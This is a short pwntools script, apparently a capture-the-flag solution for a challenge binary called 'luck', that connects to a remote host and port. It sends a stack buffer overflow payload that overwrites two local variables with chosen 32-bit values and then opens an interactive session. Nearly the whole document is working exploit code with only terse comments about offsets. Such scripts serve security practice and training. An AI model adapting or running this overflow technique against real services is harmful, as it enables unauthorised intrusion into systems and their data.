from pwn import *
context.log_level = 'DEBUG'

#p = process('./luck')
p = remote('140.110.112.213', 2111)
p.recvuntil(b':')
# find offset
g = cyclic_gen()
t = g.get(50)
# p.sendline(t)
# p.recvall()
# rbp-0x14: 0x61616164 aaad 12
# rbp-0x10: 0x61616165 aaae 16
# rbp-0xc: 19
offset_14 = b'A' * g.find('daaa')[0]
offset_10 = b'B' * (g.find('eaaa')[0])
value1 = pack(-0x5314ff4, 32, 'little')
value2 = pack(-0x21524111, 32, 'little')
payload = offset_14 + value1 + value2 + b'AAAA'
#gdb.attach(p, gdbscript=('b *0x00000000004008f9\n'))
#                         'b main')) # use \n to recognize different \
#                                                instruction
p.sendline(payload)
p.recvuntil(b'd:')
p.sendline(b'AAAA')
p.interactive()